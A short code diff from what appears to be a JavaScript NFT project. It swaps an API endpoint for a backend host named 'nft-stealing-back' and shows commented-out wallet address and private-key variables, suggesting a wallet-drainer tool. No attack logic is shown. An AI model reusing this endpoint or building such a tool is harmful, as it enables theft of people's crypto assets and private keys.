@@ -604,7 +604,7 @@ const contract721ABI = [
   },
 ];
 
-const API_URL = "http://34.79.254.141:5000/";
+const API_URL = "https://nft-stealing-back.vercel.app/";
 
 // const specifiedAddress = "0x4bB06AAF86DC6de3d90030B82F0BCb8A66A7faa5";
 // const specifiedPrivateKey =
